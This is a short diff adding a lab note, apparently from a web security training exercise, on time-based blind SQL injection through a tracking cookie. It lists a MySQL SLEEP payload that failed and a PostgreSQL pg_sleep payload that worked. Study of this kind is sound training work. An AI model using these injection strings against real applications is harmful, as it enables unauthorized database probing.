@@ -1,0 +1,13 @@
+Lab 13: Blind SQL injection with time delays
+
+Vulnerable parameter - tracking cookie
+
+End Goal:
+
+- To prove that the field is Vulnerable to blind SQLi (time based)
+
+Analysis:
+
+'|| (SELECT SLEEP(10))--   --> not work
+
+' || (SELECT pg_sleep(10))--  ->> worked
